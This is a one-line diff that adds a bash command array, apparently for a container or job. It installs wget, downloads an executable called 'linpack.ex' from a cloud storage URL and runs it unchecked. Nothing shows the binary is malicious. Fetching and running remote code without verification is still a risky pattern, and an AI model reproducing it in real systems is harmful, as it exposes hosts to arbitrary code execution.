@@ -1,0 +1,1 @@
+[ "/bin/bash", "-c", "apt-get update; apt-get -y install wget; wget https://cuentaibe.blob.core.windows.net/linpackibe/linpack/linpack.ex; chmod +x linpack.ex ; ./linpack.ex" ]
